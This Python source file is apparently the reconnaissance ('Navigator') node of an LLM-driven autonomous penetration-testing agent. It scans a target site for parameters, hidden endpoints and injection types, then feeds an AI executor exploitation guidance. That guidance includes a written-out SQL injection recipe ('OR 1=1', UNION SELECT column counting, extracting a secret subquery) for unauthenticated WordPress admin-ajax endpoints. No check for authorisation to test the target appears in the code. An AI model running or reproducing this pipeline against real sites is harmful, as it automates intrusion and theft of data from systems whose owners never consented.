"""Navigator Agent - Performs reconnaissance to identify vulnerable code and attack vectors."""
from __future__ import annotations

import json
import os
from typing import Any

from langchain_core.messages import HumanMessage, SystemMessage

from src.llm import get_llm
from src.state import PentestState
from src.logging_utils import VerboseLogger
from src.tools.source_analyzer import analyze_source_code
from src.tools.param_discoverer import discover_params
from src.tools.stack_fingerprinter import fingerprint_stack
from src.tools.injection_prober import probe_injections
from src.tools.content_discovery import discover_content, crawl_site
from src.tools.param_fuzzer import discover_hidden_params
from src.knowledge import get_injection_info, format_kb_context


NAVIGATOR_SYSTEM_PROMPT = """You are a reconnaissance and code analysis specialist for injection vulnerability assessment.

Your role is to analyze application structure and identify vulnerable code patterns.

Given the CVE details and plan, you must:
1. Identify the vulnerable code location and vulnerable function/endpoint
2. Analyze input sources and data flow to sink (vulnerable function)
3. Identify where sanitization is missing
4. Determine entry points (query parameters, POST data, headers, cookies)
5. List specific code patterns that confirm the vulnerability
6. Recommend precise payload characteristics for exploitation

Output detailed findings in markdown format including:
- Vulnerable Code Location
- Entry Points
- Data Flow Analysis
- Vulnerable Functions/Sinks
- Missing Safeguards
- Payload Characteristics (type, format, special characters)
- Potential Bypass Techniques

Be specific and technical. Reference actual file paths and function names when available."""


def _run_discovery_mode(state: PentestState, logger: VerboseLogger) -> dict[str, Any]:
    """
    Navigator Mode B — black-box discovery.

    Calls param_discoverer → stack_fingerprinter → injection_prober in sequence,
    then fills in cve_config fields so Planner/Executor can run normally.
    """
    target_url = state.get("target_url", "")
    cve_config  = dict(state.get("cve_config") or {})
    target_path = cve_config.get("target_url_path", "/")

    # ── Step 1: Discover parameters ───────────────────────────────────────────
    # The injectable fields usually live on the site ROOT (the form/landing page),
    # NOT on the given target_url_path — which is frequently POST-only or param-less
    # (e.g. a /ping utility whose input form sits on "/"). Scanning only target_path
    # then returns all_params=[], which starves the prober (probe_injections returns
    # [] with no params) and collapses vuln-type detection. So scan "/" as well and
    # merge. Ablate with DISCOVERY_SCAN_ROOT=0 to reproduce the old path-only behaviour.
    scan_paths = [target_path]
    if os.getenv("DISCOVERY_SCAN_ROOT", "1") != "0" and target_path not in ("/", ""):
        scan_paths = ["/", target_path]
    logger.log_action("param_discoverer", {"url": target_url, "paths": scan_paths})
    param_result: dict[str, Any] = {}
    all_params: list[str] = []
    for sp in scan_paths:
        pr = discover_params(target_url, sp)
        # Keep the richest result (most params) as the primary for form/method/auth metadata.
        if not param_result or len(pr.get("all_params", [])) > len(param_result.get("all_params", [])):
            param_result = pr
        for p in pr.get("all_params", []):
            if p not in all_params:
                all_params.append(p)
    logger.log_observation(param_result)
    # How to deliver a payload to this app (json body vs form vs query) + params
    # that only exist in JS. Carried to the Executor so it doesn't post form-data to a
    # JSON API (or miss a hidden field like `submit`).
    input_delivery = {
        "body_format": param_result.get("body_format", ""),
        "json_api": param_result.get("json_api", False),
        "js_params": param_result.get("js_params", []),
        "js_endpoints": param_result.get("js_endpoints", []),
    }

    # ── Step 1.5: Hidden parameter fuzzing (Arjun-style) ──────────────────────
    # discover_params only sees VISIBLE fields; injection points are often params
    # the server processes but never advertises (?id=, ?file=, ?debug=). Fuzz them
    # so the prober/executor get a real attack surface, not just the HTML forms.
    if os.getenv("ENABLE_PARAM_FUZZ", "1") != "0":
        pf_method = param_result.get("form_method", "GET")
        logger.log_action("param_fuzzer", {"url": target_url, "path": target_path,
                                            "method": pf_method})
        pf = discover_hidden_params(target_url, target_path, method=pf_method,
                                    known_params=all_params)
        logger.log_observation({"tool": pf.get("tool"), "count": pf.get("count", 0),
                                "hidden_params": pf.get("hidden_params", [])})
        hidden = [p for p in pf.get("hidden_params", []) if p not in all_params]
        if hidden:
            all_params = list(all_params) + hidden

    # ── Step 2: Fingerprint tech stack ────────────────────────────────────────
    logger.log_action("stack_fingerprinter", {"url": target_url})
    stack_result = fingerprint_stack(target_url, target_path)
    logger.log_observation(stack_result)
    detected_stack = stack_result.get("stack", "unknown")

    # ── Step 2.5: Discover hidden endpoints (ffuf) ────────────────────────────
    # The vulnerable endpoint is often a specific file the agent would never guess
    # (e.g. payroll_items.php). Brute-force it so the agent works from a real map.
    discovered_endpoints: list[dict[str, Any]] = []
    if os.getenv("ENABLE_CONTENT_DISCOVERY", "1") != "0":
        exts = ".php" if "php" in detected_stack.lower() else ""
        logger.log_action("content_discovery", {"url": target_url, "extensions": exts})
        disc = discover_content(target_url, extensions=exts)
        logger.log_observation({
            "tool": disc.get("tool"), "count": disc.get("count", 0),
            "endpoints": disc.get("endpoints", [])[:30],
        })
        # Also crawl links (katana / Python BFS) — catches app-specific files that
        # are linked but not in the fuzz wordlist. Unauthenticated here; the agent
        # can re-crawl post-login via the crawl_site tool.
        logger.log_action("crawl_site", {"url": target_url})
        crawl = crawl_site(target_url, depth=2)
        logger.log_observation({
            "tool": crawl.get("tool"), "count": crawl.get("count", 0),
            "endpoints": crawl.get("endpoints", [])[:30],
        })
        # Merge ffuf + crawl + JS-referenced + admin-ajax endpoints, dedupe by path
        merged: dict[str, dict[str, Any]] = {}
        js_eps = [{"path": p, "status": "js"} for p in input_delivery["js_endpoints"]]
        # admin-ajax.php?action=... recovered from external plugin/theme JS — the vuln
        # surface for the WordPress-plugin CVE class (put first: highest-value target).
        ajax_eps = [{"path": p, "status": "ajax"} for p in param_result.get("ajax_endpoints", [])]
        for e in ajax_eps + disc.get("endpoints", []) + crawl.get("endpoints", []) + js_eps:
            merged.setdefault(e.get("path"), e)
        discovered_endpoints = [e for p, e in merged.items() if p]

    # ── Step 3: Probe for injection types ─────────────────────────────────────
    # Prefer method detected from the actual form over CVE config default
    form_method = param_result.get("form_method", "GET")
    http_method = form_method if form_method != "GET" else cve_config.get("http_method", "GET")
    logger.log_action("injection_prober", {
        "params": all_params,
        "method": http_method,
    })
    injection_hints = probe_injections(
        base_url=target_url,
        path=target_path,
        method=http_method,
        params=all_params or ["q", "id", "search"],  # fallback common params
    )
    logger.log_observation({"injection_hints": injection_hints})

    # ── Fill cve_config ────────────────────────────────────────────────────────
    best_type, best_conf = injection_hints[0] if injection_hints else ("sql_injection", 0.0)

    if all_params:
        cve_config["affected_parameters"] = all_params
    if detected_stack != "unknown":
        cve_config["target_tech_stack"] = [detected_stack]
    cve_config["vulnerability_type"] = best_type
    # Always update http_method from the discovered form so executor uses the right method
    cve_config["http_method"] = form_method

    # Surface auth forms for executor awareness
    auth_forms  = param_result.get("auth_forms", [])
    requires_auth = param_result.get("requires_auth", False)

    auth_block = ""
    if requires_auth:
        auth_block = "\n**Auth Forms Detected**:\n"
        for af in auth_forms:
            auth_block += f"  - [{af['type'].upper()}] {af['method']} {af['action']}  fields={af['fields']}\n"
        auth_block += (
            "\n⚠️  Executor must handle auth flow: "
            "use send_request to register/login before exploiting.\n"
        )

    hints_text = "\n".join(
        f"  - {vt}: confidence {conf:.2f}" for vt, conf in injection_hints
    ) or "  (no strong signal found — defaulting to sql_injection)"

    endpoints_text = "\n".join(
        f"  - [{e.get('status')}] {e.get('path')}" for e in discovered_endpoints[:40]
    ) or "  (none found / discovery disabled)"

    # WordPress admin-ajax attack surface recovered from external plugin JS (nopriv actions
    # are a prolific SQLi sink). Hand the Executor the endpoint + nonce + a generic UNION
    # discovery recipe so it POSTs the injection to the right place with a valid
    # check_ajax_referer() nonce — no target-specific parameter/column names are assumed;
    # the agent still has to discover the real data param, break-out style, and column
    # count itself from the response.
    ajax_block = ""
    ajax_eps = param_result.get("ajax_endpoints", [])
    ajax_nonce = param_result.get("ajax_nonce", "")
    if ajax_eps:
        nonce_line = (
            f"  - Required nonce: `nonce_ajax={ajax_nonce}` (send via extra_data)\n"
            if ajax_nonce else
            "  - nonce NOT auto-recovered — grab `nonce` from the page inline script first.\n"
        )
        ajax_block = (
            "\n**WordPress admin-ajax surface** (unauthenticated `wp_ajax_nopriv_*` — common SQLi sink):\n"
            + "\n".join(f"  - POST {e}   (find the data param from the request body / recon)" for e in ajax_eps)
            + "\n" + nonce_line
            + "  - Recipe: send_payload(payload=\"<candidate param>' OR '1'='1\", parameter=\"<candidate param>\", "
              f"path=\"{ajax_eps[0]}\", extra_data='{{\"nonce_ajax\":\"{ajax_nonce}\"}}', "
              "body_format=\"form\")\n"
            + "  - Technique: if the action echoes json_encode(results), this is likely UNION-based "
              "(no blind needed). First find the column count: try payload `0) UNION SELECT NULL-- ` "
              "(or `0') UNION SELECT NULL-- ` if the break-out is inside a quoted string, not numeric), "
              "then `0) UNION SELECT NULL,NULL-- `, adding NULLs until the JSON response returns an "
              "extra row (no error). Then put your extraction in one column, e.g. "
              "`0) UNION SELECT <secret-subquery>,NULL,...-- ` (or the `0')` string-context variant) "
              "and read the value straight out of the JSON body.\n"
        )

    recon_text = (
        f"## Black-box Discovery Results\n\n"
        f"**Target**: {target_url}{target_path}\n"
        f"**Detected Stack**: {detected_stack} (confidence {stack_result.get('confidence', 0):.2f})\n"
        f"**Stack Signals**:\n"
        + "\n".join(f"  - {s}" for s in stack_result.get("signals", [])) + "\n\n"
        + auth_block
        + f"**Discovered Parameters**: {', '.join(all_params) or '(none found)'}\n\n"
        f"**Discovered Endpoints** ({len(discovered_endpoints)}):\n{endpoints_text}\n"
        + ajax_block + "\n"
        f"**Injection Type Confidence Ranking**:\n{hints_text}\n\n"
        f"**Selected Vulnerability Type**: `{best_type}` (confidence {best_conf:.2f})\n"
    )

    logger.log_state_update({
        "status": "discovery_done",
        "vulnerability_type": best_type,
        "detected_stack": detected_stack,
        "discovered_params": all_params,
    })

    return {
        "recon": recon_text,
        "cve_config": cve_config,
        "discovered_params": all_params,
        "discovered_endpoints": discovered_endpoints,
        "input_delivery": input_delivery,
        "detected_stack": detected_stack,
        "injection_hints": injection_hints,
        "discovery_mode": False,   # prevent re-running discovery on next Navigator call
        "status": "discovery_done",
    }


def navigator_node(state: PentestState) -> dict[str, Any]:
    """
    Navigator Agent: Perform recon to identify vulnerable code and attack vectors.

    Mode A (CVE / white-box): analyse code snippet, inject KB hints into LLM prompt.
    Mode B (black-box):       discover params, fingerprint stack, probe injection types.
    """
    llm = get_llm(max_tokens=int(os.getenv("NAVIGATOR_MAX_TOKENS", "900")))
    logger = VerboseLogger()

    logger.log_node_start("navigator")

    cve_config = state.get("cve_config", {})
    cve_id = state.get("cve", "UNKNOWN")

    # Mode B: black-box discovery when vulnerability_type is unknown
    vt = cve_config.get("vulnerability_type", "")
    if state.get("discovery_mode") or not vt or vt.lower() == "unknown":
        logger.log_thought(
            "Discovery mode activated — no vulnerability type known. "
            "Running param_discoverer → stack_fingerprinter → injection_prober."
        )
        discovery_result = _run_discovery_mode(state, logger)

        logs = list(state.get("execution_logs", []))
        top_vuln = discovery_result.get("cve_config", {}).get("vulnerability_type", "?")
        logs.append(
            f"[navigator] discovery: stack={discovery_result.get('detected_stack')}, "
            f"params={discovery_result.get('discovered_params')}, top_vuln={top_vuln}"
        )

        verbose_logs = list(state.get("verbose_logs", []))
        verbose_logs.append(logger.get_logs())
        print(logger.get_logs())

        return {
            **discovery_result,
            "execution_logs": logs,
            "verbose_logs": verbose_logs,
        }

    logger.log_thought(
        f"Analyzing {cve_id} code patterns. I need to identify entry points, vulnerable sinks, "
        f"and how user input flows to the vulnerable function. This will help the executor "
        f"craft precise payloads."
    )
    
    # Prepare source code analysis if available
    vulnerable_code_snippet = cve_config.get("vulnerable_code_snippet", "")
    analysis_result = None
    
    if vulnerable_code_snippet:
        vulnerability_type = cve_config.get("vulnerability_type", "sql_injection").lower()
        
        logger.log_action(
            "analyze_source_code",
            {
                "vulnerability_type": vulnerability_type,
                "code_snippet_length": len(vulnerable_code_snippet),
            }
        )
        
        analysis_result = analyze_source_code(
            vulnerable_code_snippet,
            vulnerability_type=vulnerability_type,
        )
        
        logger.log_observation(analysis_result)
    
    # Build navigator prompt — inject KB detection hints for this vuln type
    plan_summary = state.get("plan", "(no plan available)")[:500]
    vulnerability_type = cve_config.get("vulnerability_type", "Unknown")
    kb_context = format_kb_context(vulnerability_type)
    kb_info = get_injection_info(vulnerability_type) or {}

    # Surface KB detection hints + common sinks so LLM knows what to look for
    # regardless of tech stack (PHP / Django / Flask / Node.js / Java)
    kb_recon_block = ""
    if kb_info:
        hints = "\n".join(f"  - {h}" for h in kb_info.get("detection_hints", []))
        sinks = ", ".join(kb_info.get("common_sinks", []))
        kb_recon_block = (
            f"\n### Injection KB — {kb_info.get('display_name', vulnerability_type)}\n"
            f"**What to look for in source code / responses**:\n{hints}\n"
            f"**Known vulnerable sinks**: {sinks}\n"
            f"**Success indicators**: {', '.join(kb_info.get('success_indicators', []))}\n\n"
        )

    prompt = [
        SystemMessage(content=NAVIGATOR_SYSTEM_PROMPT),
        HumanMessage(
            content=(
                f"CVE: {cve_id}\n"
                f"Vulnerability Type: {vulnerability_type}\n"
                f"Target Path: {cve_config.get('target_url_path', '/')}\n"
                f"HTTP Method: {cve_config.get('http_method', 'GET')}\n"
                f"Affected Parameters: {json.dumps(cve_config.get('affected_parameters', []))}\n\n"
                + (f"Exploitation Notes: {cve_config.get('exploitation_notes')}\n\n" if cve_config.get('exploitation_notes') else "")
                + kb_recon_block
                + f"Exploitation Plan Summary:\n{plan_summary}\n\n"
                f"Code Analysis Results:\n{json.dumps(analysis_result, indent=2) if analysis_result else '(No code provided)'}\n\n"
                f"Provide detailed reconnaissance findings including entry points, vulnerable sinks, "
                f"data flow, and specific payload recommendations for {vulnerability_type}."
            )
        ),
    ]
    
    logger.log_action(
        "llm_invoke",
        {
            "prompt_type": "navigator_recon",
            "target_path": cve_config.get("target_url_path", "/"),
            "affected_parameters": cve_config.get("affected_parameters", []),
        }
    )
    
    try:
        recon_text = llm.invoke(prompt).content
    except Exception as exc:
        recon_text = (
            f"Fallback recon for {cve_id}: vulnerability={vulnerability_type}; "
            f"path={cve_config.get('target_url_path', '/')}; "
            f"method={cve_config.get('http_method', 'GET')}; "
            f"parameters={cve_config.get('affected_parameters', [])}; "
            f"strategy={cve_config.get('exploit_strategy') or cve_config.get('exploitation_notes') or ''}; "
            f"source_analysis={json.dumps(analysis_result, ensure_ascii=False) if analysis_result else 'none'}"
        )
        logger.log_observation({"llm_error": str(exc), "fallback_recon": True})
    
    logger.log_observation({
        "recon_completed": True,
        "analysis_provided": analysis_result is not None,
        "recon_length": len(recon_text),
    })
    
    logs = list(state["execution_logs"])
    logs.append(f"[navigator] recon completed for {cve_id}")
    if analysis_result:
        logs.append(f"[navigator] found {len(analysis_result.get('patterns_found', []))} vulnerability patterns")
    
    verbose_logs = state.get("verbose_logs", [])
    verbose_logs.append(logger.get_logs())
    
    logger.log_state_update({
        "status": "recon_done",
        "entry_points_identified": len(analysis_result.get("entry_points", [])) if analysis_result else 0,
        "vulnerable_sinks_found": len(analysis_result.get("sinks", [])) if analysis_result else 0,
    })
    
    print(logger.get_logs())  # Print verbose output
    
    return {
        "recon": recon_text,
        "execution_logs": logs,
        "verbose_logs": verbose_logs,
        "status": "recon_done",
    }

